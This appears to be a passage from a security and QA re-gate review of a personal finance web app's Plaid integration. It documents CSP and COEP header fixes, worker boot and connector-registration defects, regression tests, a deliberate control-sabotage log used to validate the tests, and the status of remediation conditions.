Live headers as served through Caddy with `PLAID_ENABLED=true`:

```
content-security-policy: default-src 'self'; script-src 'self';
  script-src-elem 'self' https://cdn.plaid.com;
  frame-src 'self' https://cdn.plaid.com; style-src-elem 'self';
  style-src-attr 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self';
  connect-src 'self' https://cdn.plaid.com https://sandbox.plaid.com https://production.plaid.com;
  worker-src 'self' blob:; manifest-src 'self'; object-src 'none';
  frame-ancestors 'none'; base-uri 'none'; form-action 'self'
cross-origin-embedder-policy: credentialless
```

That is C-2 as landed, observed live rather than read out of the Caddyfile:
`script-src` itself is still `'self'` (only `script-src-elem` carries the CDN),
and COEP flipped to `credentialless` exactly as `PLAID_ENABLED` is supposed to
make it.

#### Transcript, steps 1–6

| #   | Step                             | Observed through the real proxy                                                                                                                                                                                                                                                                                                                                                  | Screenshot                                                             |
| --- | -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| 0a  | Enrol a passkey                  | `POST /api/auth/register/options` → `POST /api/auth/register/verify`, real `create()` on the virtual authenticator; app advanced to "Add a backup passkey".                                                                                                                                                                                                                      | `regate-01-register.png`, `regate-02-after-enrol.png`                  |
| 0b  | Log in                           | `POST /api/auth/login/verify -> 200` and **`GET /api/auth/session -> 200 {"userId":"01a0a727-…","displayName":"Regate Reviewer","authMethod":"webauthn","fresh":true}`** — a real passkey login over TLS through Caddy.                                                                                                                                                          | `regate-03-signed-in.png`                                              |
| 1   | `/api/...` succeeds; app renders | **`GET /api/transactions -> 200 {"items":[],…}`**, `GET /api/accounts -> 200 {"accounts":[]}`, `GET /api/connections -> 200`, `GET /api/connectors -> 200 {…"plaid"…}`, `GET /api/net-worth -> 200`. JSON, not `<!doctype html>`. **F-4 does not reproduce.** `/transactions` and `/accounts` render the app frame with a true empty state.                                      | `regate-04-transactions-empty.png`, `regate-05-accounts-empty.png`     |
| 2   | Add a Manual account             | Add connection → **Manual account** tab → "Rental property" → `POST /api/connections -> 201 {"connectionId":"01a0a72c-…","accountIds":["01a0a72c-…"],"syncRunId":"01a0…"}`. The step-up 403/retry ran a **real** WebAuthn assertion.                                                                                                                                             | `regate-07-add-connection-dialog.png`, `regate-08-manual-added.png`    |
| 3   | Import a CSV                     | **File import** tab → five-row `Date,Description,Amount` fixture, preset `iso_signed`, account "Checking 1234" → `POST /api/imports/csv -> 200 {"connectionId":"01a0a72d-…","syncRunId":"01a0a72d-…"}`.                                                                                                                                                                          | `regate-09-csv-form.png`, `regate-10-csv-imported.png`                 |
| 3b  | Its transactions in the list     | `/transactions` shows all five: _Sep 7 Regate Test Merchant −$19.99*, *Sep 5 City Power AND Light −$131.40_, _Sep 3 Whole Foods MKT −$84.17*, *Sep 2 Acme Payroll Direct DEP +$2,450.00_, and the coffee row — each on account **Checking 1234**. The account filter offers both new accounts.                                                                                   | `regate-11-transactions-list.png`                                      |
| 4a  | Edit a **note**                  | Detail sheet → Note → blur → `PATCH /api/transactions/01a0a72d-1ac9-… -> 200`.                                                                                                                                                                                                                                                                                                   | `regate-12-transaction-detail.png`, `regate-13-transaction-edited.png` |
| 4b  | …persists after reload           | Full page reload, re-open the row: `{"note":"re-gate note: category + note persistence check"}` read back from `GET /api/transactions/{id}`. **Persisted.**                                                                                                                                                                                                                      | `regate-14-transaction-persisted.png`                                  |
| 5   | Accounts and balances            | `/accounts` renders both accounts grouped under CASH with a Net worth tile — but every balance reads **"No balance yet"**, and `GET /api/net-worth -> 200 {"asOf":null,"totals":[],"inputs":[{…,"balance":null}]}`. Neither the manual nor the CSV connector supplies a balance. Real balances are reached in step 8 (Plaid).                                                    | `regate-15-accounts-balances.png`                                      |
| 6   | Connections, manual healthy      | `/accounts/connections` lists **Rental property — Connected · 1 account · Synced 2 minutes ago** and **Re-gate statements — Connected · 1 account · Synced 1 minute ago**, each with _Sync now_ / _Disconnect_ / _Show sync history_. The SSE status pill reads **"Synced 1 minute ago"** (it read "No syncs yet" before the first connection, so the pill is live, not static). | `regate-16-connections-healthy.png`                                    |

**Zero CSP violations and zero page errors across steps 1–6.** The only console
noise was `net::ERR_NETWORK_CHANGED` on two SSE reconnects and one `401` on a
pre-login session probe.

#### Step 4, category half — reachable in the API, not in the UI (N-3, LOW)

The category edit could not be made _through the UI_, and this is a documented
Phase 1 scope gap rather than a defect hidden from anyone.
`apps/web/src/features/transactions/CategoryPicker.tsx` renders a `<select>`
with exactly one `<option value="">Uncategorized</option>`, and says why in its
own doc comment: no `GET /categories`-shaped route exists. Confirmed
independently — the contract has **no** category path:

```
$ node -e "…Object.keys(openapi.paths).filter(p => /categor/.test(p))"
[]

$ docker compose exec db psql -U personalfi -d personalfi -c 'select count(*) from categories'
 0
```

So on a fresh deployment the taxonomy is empty _and_ unroutable, and a user can
never set a category from the app. The **write path is real**, which this gate
proved rather than assumed: a category row seeded directly into the running
deployment's database, then, from inside the authenticated browser session
through the real proxy and with the real `__Host-pfi_csrf` token:

```
{ "csrfPresent": true,
  "patchStatus": 200,
  "patchedCategoryId":  "a4645f77-17f7-4290-aa55-e54834664fbe",
  "rereadCategoryId":   "a4645f77-17f7-4290-aa55-e54834664fbe",
  "rereadNote": "re-gate note: category + note persistence check" }
```

`PATCH /api/transactions/{id}` with a `categoryId` is accepted, stored and read
back, alongside the note, so C-4's "edit a category … and confirm they persist"
is satisfied at the API and **blocked at the UI by a missing route**, not by a
bug. Recorded as **N-3 (LOW)**: not a security finding, but Phase 1's
categorization work is not user-reachable in the deployed app, and the mocked
Playwright walkthrough cannot see that because its mock serves a category list
the real API does not have. This belongs with C-5 in Phase 2 planning.

### 8.4 F-5 (HIGH, fixed in place) — C-2 did not close F-3: Plaid Link still could not open

**This is the decisive re-gate finding, and it is the same shape as every
decisive finding before it: a control whose evidence was derived from a signal
that cannot distinguish success from failure.**

Step 7 of the walk — click **Connect with Bank or brokerage (Plaid)** in the
real browser, on the production stack, with `PLAID_ENABLED=true` and the
C-2 CSP live. What happened:

```
POST /api/connections/plaid/link-token -> 200 {"linkToken":"link-sandbox-…","expiresAt":"…"}
REQ  script   https://cdn.plaid.com/link/v2/stable/link-initialize.js
RESP 200      https://cdn.plaid.com/link/v2/stable/link-initialize.js      <-- CSP fix works
REQ  document https://cdn.plaid.com/link/v2/stable/link.html?isLinkInitialize=true&token=link-sandbox-…
FAIL          https://cdn.plaid.com/link/v2/stable/link.html?…   net::ERR_BLOCKED_BY_RESPONSE
FRAMENAV      chrome-error://chromewebdata/
REQ  document https://cdn.plaid.com/link/v2/stable/link-open.html?linkOpenId=…
FAIL          https://cdn.plaid.com/link/v2/stable/link-open.html?…   net::ERR_BLOCKED_BY_RESPONSE
FRAMENAV      chrome-error://chromewebdata/

VIOLATIONS: ["style-src-elem :: inline"]
FRAMES: ['https://personalfi.lan/accounts/connections', 'chrome-error://chromewebdata/']
```

The link token is minted, the CDN script loads — C-2's `script-src-elem`
widening genuinely works — and then **Link's iframe is refused and the whole
flow dies silently**. No error is shown to the user: the dialog just sits
there. Two independent blockers, neither of which C-2 addressed:

**(a) `Cross-Origin-Embedder-Policy: credentialless` blocks the iframe.**
`credentialless` relaxes COEP for _no-cors subresources_ — which is why
`link-initialize.js` (a `<script src>`) loads. It does **not** relax it for
nested **documents**: a cross-origin iframe inside a COEP-enabled page must
itself send `Cross-Origin-Embedder-Policy`, and `cdn.plaid.com` sends none. So
`link.html` is `ERR_BLOCKED_BY_RESPONSE`, and — as
`gate-remediation-web.md` correctly says in its own third probe row — **a COEP
block fires no `securitypolicyviolation` event**. It is silent by design.

**(b) `style-src-elem 'self'` blocks Link's injected inline `<style>`.** The one
violation that _did_ fire. Even with (a) fixed, `link.html` loaded with an
empty body and rendered nothing.

#### Why the remediation's evidence said the opposite

`gate-remediation-web.md`'s probe matrix records, for the "Enabled, real
config" row: _script tag_ **loaded**, _iframe_ **loaded, no violation**. That
row is wrong, and the reason is written two rows above it in the same table:
for the Plaid-**disabled** row the author noted that _"`onload` fired anyway —
Chromium fires `load` on a CSP-blocked frame's fallback navigation; the
violation event is the authoritative signal."_ For the enabled row the
authoritative signal was **not** available (COEP blocks emit no violation), so
"no violation" plus "`onload` fired" was read as success when it is exactly the
signature of a silent block. The probe also created a bare `<iframe
src="link.html">` rather than calling `openPlaidLink()`, so it never met
blocker (b) at all.

This is the Phase 0 R-1 / F-3 pattern once more: **a control that cannot
observe its own failure mode.** The first gate flagged F-3 empirically, by
watching the browser refuse the script. The remediation's probe watched for a
signal that does not exist for the failure that remained.

#### Fixed in place (6 lines of `docker/Caddyfile`, both halves verified)

```diff
+	map {$PLAID_ENABLED:false} {plaid_style_src} {
+		true " 'unsafe-inline' https://cdn.plaid.com"
+		default ""
+	}
 	map {$PLAID_ENABLED:false} {coep_policy} {
-		true "credentialless"
+		true "unsafe-none"
 		default "require-corp"
 	}
-…; style-src-elem 'self'; style-src-attr 'unsafe-inline'; …
+…; style-src-elem 'self'{plaid_style_src}; style-src-attr 'unsafe-inline'; …
```

Proven load-bearing by applying each half separately against the running stack
(rebuild `proxy`, `--force-recreate`, re-drive the real browser):

| Caddyfile state                                   | Link iframe                                                                                          | CSP violations             | Link UI                                                                                  |
| ------------------------------------------------- | ---------------------------------------------------------------------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------------- |
| as committed at `a438ec8` (`credentialless`)      | `ERR_BLOCKED_BY_RESPONSE`, error page                                                                | `style-src-elem :: inline` | nothing                                                                                  |
| COEP `unsafe-none` only                           | **loads** `link.html`, Link's bundles, `sandbox.plaid.com` heartbeat + `link/workflow/event` all 200 | `style-src-elem :: inline` | **empty body** — still unusable                                                          |
| COEP `unsafe-none` **+** `style-src-elem` widened | loads                                                                                                | **none**                   | **"PersonalFi uses Plaid to connect your account"** — Link's real consent screen renders |

Both halves are necessary; neither alone is sufficient.

#### The security trade this makes, stated plainly

`Cross-Origin-Embedder-Policy: unsafe-none` gives up **cross-origin isolation**
— but only on a deployment that has turned Plaid on, and only COEP: COOP stays
`same-origin`, CORP stays `same-origin`, `frame-ancestors 'none'`, `object-src
'none'` and `base-uri 'none'` are untouched, and `script-src` is still
`'self'`. This app uses no `SharedArrayBuffer` and no high-resolution timers,
so what is actually lost is a Spectre-class defence-in-depth layer, not a
control anything depends on. There is no alternative that keeps it: embedding a
third-party document that does not send COEP is incompatible with COEP by
specification, and Plaid does not send it. The only other route to Link is
OAuth/redirect mode, which is a Phase 2-sized change.

`style-src-elem 'unsafe-inline'` (Plaid-enabled only) permits injected
`<style>` elements. It is genuinely weaker than `'self'` — a CSS injection
could exfiltrate via attribute selectors — but it is **styles, not scripts**;
`script-src`/`script-src-elem` are unchanged; this app already ships
`style-src-attr 'unsafe-inline'` unconditionally; and Plaid's inline styles
have no stable hash to pin (the offered hash differs run to run).

**Both trades should be ratified by the owner**, not adopted because a gate
applied them. What is not negotiable is the finding: **before this fix, Plaid
Link could not be opened at all in the production stack**, which means C-2 was
not satisfied and Phase 1's headline deliverable was unreachable in the
browser — the exact condition the first gate raised F-3 for.

The `csp-plaid` Playwright project asserts the emitted header **text** against
strings committed in the test, so it must be updated to the new policy; that
update is in §8.5, together with a regression test that fails on the _behaviour_
rather than on the header text.

### 8.5 N-4 and N-5 (both CRITICAL, both fixed in place) — the worker has never done any work

Step 7 succeeded: **Plaid Link was driven end to end in the real browser**, in
Sandbox, through the real proxy (§8.6 has the transcript). The connection was
created, 14 accounts, the credential sealed. And then it read **"Never
synced"** — and stayed that way. Chasing that produced the two worst findings
of this phase, in the one process nobody has ever watched.

#### N-5 (CRITICAL) — the worker does not register the Plaid connector

```
$ docker compose logs worker | …
warn  job failed; retrying with backoff  {"kind":"connections.sync","attempt":1,"maxAttempts":5,
        "err":"no connector is registered for provider \"plaid\""}
… attempts 2, 3, 4 …
error job exhausted its retries and is dead   {"kind":"connections.sync","attempt":5,
        "err":"no connector is registered for provider \"plaid\""}
```

One line, two call sites:

```
$ grep -rn 'createConnectorRegistry(' apps/api/src
apps/api/src/app.ts:322     createConnectorRegistry({ plaid: config.plaid, clock, logger: app.log });
apps/api/src/worker.ts:132  registry: createConnectorRegistry(),
```

`createConnectorRegistry()` feature-detects on `options.plaid`, so with no
arguments it takes the `plaid === null` branch and registers only Manual and
CSV. **The worker is the only process that runs a queued or scheduled sync.**
So the deployed system can mint a link token, drive Link, exchange a public
token, seal the credential and create fourteen accounts — every step C-3 and
C-2 were about — and then **never sync any of it, ever**, with the failure
buried in a worker log nobody reads and a `jobs` row in state `dead`.

This is C-3's premise defeated by a missing argument. `compose.yml` mounts the
three `plaid_*` secrets on `worker` specifically so this line can use them, and
the worker's own boot log proudly reports
`"secretsPresent":[…,"plaid_client_id","plaid_secret","plaid_env"]` — the
secrets arrive and the code never asks for them.

**Why nothing caught it:** every test that exercises a connector registry or a
job runner constructs its own registry. Nothing asserts that the worker's
composition root registers what the API's does. `wp1.3b`'s live-Sandbox smoke
drives `exchange` → sync inside **one** process with a registry it built
itself, so it proves the adapter and proves nothing about the worker.

**Fixed** in `apps/api/src/worker.ts` (one call, plus the comment explaining
why it must never be called bare again).

#### N-4 (CRITICAL) — the worker could not boot at all, silently, and its healthcheck said it was fine

Before N-5 could even be seen, the worker had to survive boot. It was not:

```
$ docker inspect personalfi-worker-1 --format '{{.State.Status}} restarts={{.RestartCount}} health={{.State.Health.Status}}'
running restarts=189 health=healthy
```

**189 restarts**, roughly one every 14 seconds since the stack came up, and the
log showed one message per life and never a second one:

```
$ docker compose logs worker | grep -o '"msg":"[^"]*"' | sort | uniq -c
      6 "msg":"configuration loaded"
```

The next line `worker.ts` would emit is `key custody: unlocked`, immediately
after `box.unlock(passphrase)` — 1 GiB of Argon2id. `compose.yml` capped the
worker at **512M** while `KEK_ARGON2_MEMORY_KIB` is **1048576 KiB (1 GiB)**.
Proven by changing nothing but the limit on the live container:

```
$ docker update --memory 2g --memory-swap 2g personalfi-worker-1 && docker restart personalfi-worker-1
$ docker compose logs worker | grep -o '"msg":"[^"]*"'
"configuration loaded"
"key custody: unlocked"
"modules resolved"
"consumer pump started"
"job runner started"
"scheduler started"
"scheduler leadership acquired"
"worker ready"
```

Consequences on the stack as committed, all observed:

- the **consumer pump** never ran — categorization never fired;
- the **job runner** never ran — `select kind, status from jobs` showed
  `connections.sync | pending | attempts 0` sitting untouched;
- the **scheduler** never ran — `select * from schedules` returned **0 rows**,
  so the nightly sync had never even been _registered_, and C-4's "confirm the
  worker runs a scheduled sync" was not slow, it was impossible.

**`compose.yml` predicted this exactly, in the comment on the line itself:**

> `**Phase 1 must raise this back to 1536M in the same PR that makes the worker
unlock the keyring**` (the first sync job that decrypts a provider
> credential) — at 512M the KEK derivation is OOM-killed at exit 137 with no
> output, which is precisely how the api failure presented.

Phase 1 made the worker unlock the keyring (`worker.ts`'s `box.unlock`) and did
not raise the limit. The instruction was written down, in the right file, on
the right line, and not executed — the same "hand-maintained half of a
computed pair" failure as F-1, F-4 and N-1, in its purest form: a TODO
addressed to a future PR, with nothing that fails when that PR does not do it.

**Compounding it: the worker's healthcheck cannot fail.**

```yaml
healthcheck:
  test: ['CMD', 'node', '-e', 'process.exit(0)']
```

That asserts the Node binary exists. A worker that has restarted 189 times
without ever starting a job runner reports `healthy`, `docker compose ps` looks
clean, and the first gate's §3 "the worker boots, derives the KEK and reports
healthy" was reading this. It reported healthy; it did not derive the KEK.
Recorded as **N-6 (MEDIUM)**: the worker needs a liveness probe that asserts
something it could fail — e.g. that the job runner has polled within
`JOB_POLL_INTERVAL_MS × k`, which it already records.

**Fixed** in `compose.yml`: `512M` → `1536M`, matching the api, which pays the
identical Argon2id cost.

#### Regression test — `apps/api/test/regate-worker-boot.test.ts`

Three tests, asserting against the composition root and the deployment
descriptor as committed (a test that boots a worker would itself need a
database, a KEK and a gibibyte):

1. every `createConnectorRegistry(` call in **both** `app.ts` and `worker.ts`
   passes `plaid` — so the two composition roots cannot drift again;
2. the registry omits `plaid` unconfigured and includes it configured;
3. the `worker:` memory limit in `compose.yml` is **strictly greater** than
   `KEK_ARGON2_MEMORY_KIB` read out of `.env.example`, so raising the KEK
   parameters without raising the limit fails too.

**Proven load-bearing** — both original defects restored, test re-run:

```
$ pnpm exec vitest run --project api regate-worker-boot
 × builds its connector registry from configuration, exactly as the API does
AssertionError: apps/api/src/worker.ts: createConnectorRegistry() is called without `plaid`,
  so the Plaid connector is silently unregistered in that process. The worker is the only
  process that runs a queued or scheduled sync.: expected false to be true
 × gives the worker more memory than the KEK derivation it performs needs
AssertionError: worker memory limit 512MiB is not above the 1024MiB Argon2id KEK derivation
  it performs at boot. … no consumer pump, no job runner, no scheduler, and an empty
  `schedules` table.: expected 512 to be greater than 1024
      Tests  2 failed | 1 passed (3)
```

Fixes restored: `3 passed (3)`.

### 8.6 The browser walk, steps 7–11 — Plaid end to end

Re-run after the three fixes above (`docker compose build`, stack recreated).
The worker's boot log is now what it should always have been:

```
info configuration loaded
info key custody: unlocked                 {"kekVersion":1}
info plaid configured; connector registered {"provider":"plaid","environment":"sandbox"}
info modules resolved   {"enabled":["module.ledger","module.connections","module.categorization"]}
info consumer pump started / job runner started / scheduler started
info scheduler leadership acquired
info worker ready
```

| #   | Step                                | Observed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Screenshots                                                                      |
| --- | ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| 7   | **Plaid Link, in the real browser** | Add connection → Bank or brokerage (Plaid) → Connect. `POST /api/connections/plaid/link-token -> 200`. Link's own UI, driven headlessly inside `cdn.plaid.com/link/v2/stable/link.html`: consent → _Continue without phone number_ → institution search → **ins_109508 "First Platypus Bank"** → credential form → `user_good`/`pass_good` → account picker (14 accounts) → _Continue_ → **"Success — Your account has been successfully linked to PersonalFi"**. Then, from the app: **`POST /api/connections/plaid/exchange -> 201 {"connectionId":"01a0a747-…","relinked":false,"accountIds":[14 ids]}`**, step-up gated by a real WebAuthn assertion. **Zero CSP violations.** | `regate-17-plaid-tab.png` … `regate-19-plaid-*.png`, `regate-20-plaid-after.png` |
| 8   | First sync completes                | Connections showed _Platypus No Products — Connected 14 accounts · **Never synced**_ (N-5's symptom). After the fix: _Sync now_ → SSE status pill goes to **"Synced 0 seconds ago"** and the card to **"Connected 14 accounts · Synced 0 seconds ago"**. Data: `sync_runs` `success/manual`, **394 Plaid transactions**, **14 balance rows**.                                                                                                                                                                                                                                                                                                                                      | `regate-21..23-*.png`, `regate-24-transactions-after-plaid.png`                  |
| 5′  | Balances (deferred from step 5)     | `/accounts` now reads **Net worth −$77,164.15**, **CASH $62,589.00**, _Plaid CD ••2222 +$1,000.00_, and the rest of the fourteen. The manual and CSV accounts still read "No balance yet" — neither connector supplies one, which is correct for them.                                                                                                                                                                                                                                                                                                                                                                                                                             | `regate-25-accounts-balances.png`                                                |
| 9a  | **Forced reauth**                   | `POST https://sandbox.plaid.com/sandbox/item/reset_login -> 200 {"reset_login":true}`, issued from **inside the api container** using the deployment's own key custody (`SecretBox.unlock` → `openText`), so the access token never left the process. Next sync: worker logs `sync failed {"kind":"auth_required","condition":"AUTH_REQUIRED"}`; the UI, live over SSE, changes to **"1 connection needs attention"** / **"Platypus No Products — Needs reconnection"** with a _Reconnect_ button.                                                                                                                                                                                 | `regate-26-reauth-*.png`, `regate-27-reauth-required.png`                        |
| 9b  | **Reconnect, no data loss**         | _Reconnect_ → `POST /api/connections/{id}/plaid/update-link-token -> 200` (step-up) → Link in **update mode** (_"Enter your password — Securely reconnect your account. User ID: use•••••"_ — it does not re-ask for the institution) → `POST /api/connections/{id}/reconnect -> 200 {"relinked":true,"accountIds":[the same 14]}`. Card returns to _Connected 14 accounts · Synced_. **No data loss, verified in the database:** 394 Plaid + 5 file-import transactions before and after, same connection id, credential re-sealed, and the user overlay (note + category) intact.                                                                                                | `regate-28..31-*.png`                                                            |
| 10  | **Scheduled worker sync**           | With the schedule shortened (`cron='* * * * *'`, `jitter_seconds=0`) and **no user action at all — no browser open**, new rows appeared within 9 seconds: `sync_runs.trigger = 'scheduled'`. The worker's scheduler, job runner and fan-out all ran on their own. Plaid itself was correctly **skipped** (`sync skipped {"reason":"min_interval"}`) because it had just synced — the rate-limit ratchet doing its job. Schedule restored to `15 3 * * *` / 1200s jitter afterwards.                                                                                                                                                                                                | —                                                                                |
| 11  | **Disconnect and `/item/remove`**   | _Disconnect_ → `DELETE /api/connections/{id} -> 200 {"revokedAtProvider":true,"providerSlotMayRemain":false}`. **Independently verified at Plaid**, with the access token stashed inside the container before the disconnect and read back after: `/item/get` returned **`status=200 item_present=true` before** and **`status=400 error_code=ITEM_NOT_FOUND` after**. `/item/remove` genuinely happened. Locally, `sealed_credentials IS NULL`, status `disconnected`, and the 394 transactions are retained as history.                                                                                                                                                          | `regate-32..34-*.png`                                                            |

**The Sandbox Item is removed** (`ITEM_NOT_FOUND`), so the teardown obligation
is met whatever else happens.

#### N-7 (HIGH) — every scheduled sync marks Manual and CSV connections "Needs reconnection"

The step-10 scheduled run is what exposed this. Both non-Plaid connections
**failed**:

```
$ select c.provider, sr.status, sr.error_kind, sr.error_detail from sync_runs sr … where trigger='scheduled'
 manual      | failed | auth_required | {"condition":"AUTH_REQUIRED","message":"this manual connection has been disconnected"}
 file_import | failed | auth_required | {"condition":"AUTH_REQUIRED","message":"this import has been disconnected; upload the file again"}

$ select display_name, provider, status from connections;
 Rental property      | manual      | reauth_required
 Re-gate statements   | file_import | reauth_required
 Platypus No Products | plaid       | active
```

and the UI went to **"2 connections need attention"**.

Cause: `apps/api/src/domain.ts` builds the manual connector as
`new ManualConnector({ store: new ManualStore() })`, and `ManualStore` is
`readonly #connections = new Map()` — **per-process, in memory**. The CSV
connector is the same shape. The worker is a _different process_ with a
_different, empty_ store, so from its point of view every manual and
file-import connection has "been disconnected".

This is N-5's sibling: state that is correct within one process and wrong
across the two-process deployment. It is worse than N-5 in one way — it is not
a missing argument but a design assumption — and better in another: no data is
lost, the ledger rows are durable and untouched.

Consequences in the deployed system:

- **on the first nightly run**, every manual account and every CSV import the
  user has ever made flips to "Needs reconnection", permanently and falsely;
- a Manual connection has no meaningful reconnect (there is no provider to
  re-authenticate to), so the user has no recovery path from the UI;
- `listSyncableConnections` then filters `reauth_required` out of future
  scheduled runs, so the false state is also sticky;
- the same happens in the **api** process after any container restart, for a
  user-triggered _Sync now_.

**Not fixed here**, deliberately: the narrow fix (exclude connectors that
cannot be polled from the scheduled fan-out, keyed off `connector.capabilities()`
rather than a provider name) is ~10 lines in `syncableConnectionIds`
(`apps/api/src/modules.ts`) but leaves the api-restart case, and the real
answer — whether a Manual/CSV connector should have provider-side state at all,
or whether the ledger is its only store — is a design decision for the
connector-port owner, not a gate. Recommended immediate mitigation, exactly as
scoped:

```diff
-  const rows = await listSyncableConnections(executor, userId);
-  return rows.map((row) => row.id);
+  const rows = await listSyncableConnections(executor, userId);
+  // A connector with no provider to poll must not be in the scheduled
+  // fan-out: its adapter's state is per-process, so a worker that never
+  // linked it reports AUTH_REQUIRED and the UI shows a false
+  // "Needs reconnection" after the first nightly run (re-gate N-7).
+  return rows.filter((row) => registry.get(row.provider).capabilities().pollable).map((r) => r.id);
```

(`pollable` does not exist on `ConnectorCapabilities` yet; adding it is part of
the fix.)

### 8.7 Sabotage log — every remediation control, broken by this reviewer

Each control was broken once, in production code or configuration, by this
reviewer, and observed going red. None of these transcripts is copied from
`gate-remediation-web.md` or `gate-remediation-api.md`; where a break is
deliberately _different_ from theirs, that is said. Everything was restored
with `git checkout --` / a backup copy, and `git status` at the end shows only
evidence, screenshots, tests and fixes.

| #   | Control (condition)                                          | This reviewer's break                                                                           | Result                                                                                                                                                                                                                                    |
| --- | ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| G1  | `scripts/check-proxy-routes.ts` — prefix stripping (C-1b)    | `handle_path /api/*` → `handle /api/*` (the Phase 0 M-3 bug, not the remediation's extra block) | **RED first try.** `the block proxying to the api uses 'handle', not 'handle_path' — 'handle' does not strip the matched prefix … (Phase 0 M-3).` exit=1                                                                                  |
| G2  | `scripts/check-proxy-routes.ts` — contract agreement (C-1b)  | `openapi.json` `servers[0].url` `/api` → `/` (the contract moved, not the Caddyfile)            | **RED first try.** `the api is proxied at '/api/*', but … servers[0].url is '/' — expected the Caddyfile to route exactly '/*'.` exit=1                                                                                                   |
| G3  | `gate-image-closure.test.ts` (C-1c)                          | `docker/api.Dockerfile` prune stage gains `rm -rf packages/connectors/plaid`; image rebuilt     | **RED first try, both tests** (`2 failed (2)`), including `can import the composition root inside the image`. `docker build` still exited 0 — a broken image builds clean, which is the whole reason this test exists.                    |
| G4  | Plaid CSP gated on `PLAID_ENABLED` (C-2)                     | COEP `map`'s `default` row changed to `unsafe-none` — i.e. the **gate** removed, not the value  | **RED first try, and correctly localised**: `Plaid disabled (PLAID_ENABLED unset)` failed with `Expected: "require-corp" / Received: "unsafe-none"`; the enabled case stayed green. A Plaid-less deployment losing COEP is caught.        |
| G5  | Ten-Item ratchet inside `linkConnection`, across users (C-3) | `countConnectionsByProvider` given `and(…, sql\`false\`)` — always 0, so the cap can never trip | **RED first try.** `api-db` `is global (not per-user), survives a disconnect, and cannot be bypassed via POST /connections`: `expected 201 to be 409`.                                                                                    |
| G6  | SSE per-session cap (C-6)                                    | `SSE_MAX_STREAMS_PER_SESSION` 3 → `9_999`                                                       | **RED first try.** `refuses one more stream than SSE_MAX_STREAMS_PER_SESSION on one session, with 429 and Retry-After`: `expected 429 to be 200`.                                                                                         |
| G7  | `plaid_*` unreadable from the environment (C-3 / R-1)        | `plaid_client_id` given `envFallback: 'PLAID_CLIENT_ID'` (the remediation broke `plaid_secret`) | **RED first try, 2 of 8.** `has file-only secrets to check, and they include every plaid_* one`: `expected 3 to be greater than or equal to 4`, plus the behavioural `does not configure Plaid from a full set of environment variables`. |
| G8  | `csp-plaid` committed-policy assertion (C-2) — _unplanned_   | (none — this reviewer's own F-5 Caddyfile fix)                                                  | **RED immediately**, with a full expected/received diff naming `style-src-elem`. This control caught a real change the moment it was made, which is the best evidence there is that it is not self-referential.                           |

Seven planned sabotages, seven red on the first try, plus one unplanned. **The
C-1/C-2/C-3/C-6 controls are real.** What they do not cover is the _deployed
behaviour_ they were written to protect — F-5, N-4, N-5 and N-7 all passed
straight through them, because each control checks a file's text or a single
process's logic and none of them runs the system.

Restoration verified per sabotage with `git diff --quiet <file>`; the only
tracked changes remaining are this reviewer's four fixes and this document.

### 8.8 Conditions C-1..C-6 — status

| #        | Condition                                                 | Status                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| -------- | --------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **C-1a** | API gets its own routed namespace                         | **CLOSED.** F-4 does not reproduce in a real browser: `GET /api/transactions` → `{"items":[…]}`, `/api/accounts`, `/api/connections`, `/api/connectors`, `/api/net-worth`, `/api/sync/stream` all answer JSON/SSE, and `/transactions`/`/accounts` render the SPA. Every API call the app made in the whole walk was under `/api/`.                                                                                                                                                                              |
| **C-1b** | CI check: proxy prefixes == contract prefixes             | **CLOSED.** Sabotaged red twice, by this reviewer, on both halves it guards (G1, G2). Wired into `just check` and the CI `lint` job.                                                                                                                                                                                                                                                                                                                                                                             |
| **C-1c** | image-closure test in CI's image job                      | **CLOSED as far as this environment can**: sabotaged red against a deliberately broken, freshly built image (G3), and green against the real one. Still **unverified in a real Actions run** — no remote, same open item the remediation recorded. Carried forward, not re-raised.                                                                                                                                                                                                                               |
| **C-2**  | Widen the CSP for Plaid, narrowly, only when configured   | **WAS NOT CLOSED; now closed by this gate.** See §8.4 (F-5): Link could not open at all. Fixed in `docker/Caddyfile`, proven by driving real Plaid Link to "Success" in a real browser with **zero CSP violations**, and the `csp-plaid` expectations updated. The two security trades (COEP `unsafe-none`, `style-src-elem 'unsafe-inline'`, both Plaid-enabled only) **need the owner's ratification** — see §8.4.                                                                                             |
| **C-3**  | Mount `plaid_*`, document, redirect URI, close ratchet    | **PARTIALLY CLOSED.** Secrets are mounted on `api` and `worker` and the api registers Plaid (observed). The ratchet is real (G5) and the env ban is real (G7). But the condition's _purpose_ — Plaid working in the deployed system — was defeated by **N-5** (the worker never registered the connector, so no Plaid connection could ever sync) and blocked at install by **N-1** (`just harden-secrets` does not cover the three new secrets, so a hardened deployment crash-loops). N-5 fixed; N-1 reported. |
| **C-4**  | Re-walk the Phase 1 user path; scheduled worker sync      | **CLOSED, and it is what found F-5, N-1, N-2, N-4, N-5, N-6 and N-7.** All eleven steps reached — §8.3 and §8.6. The scheduled sync was observed with no user action (`sync_runs.trigger='scheduled'`). One step is API-reachable but not UI-reachable: the category edit (**N-3**).                                                                                                                                                                                                                             |
| **C-5**  | Decide R-4 (`merchantId`) before Phase 2                  | **Still open**, assigned to Phase 2 planning by the orchestrator. Not this gate's to close. Note the re-gate's CSV import produced merchant rows from raw descriptors exactly as R-4 describes (`Regate Test Merchant`, `City Power AND Light`), so the behaviour is confirmed, not the decision.                                                                                                                                                                                                                |
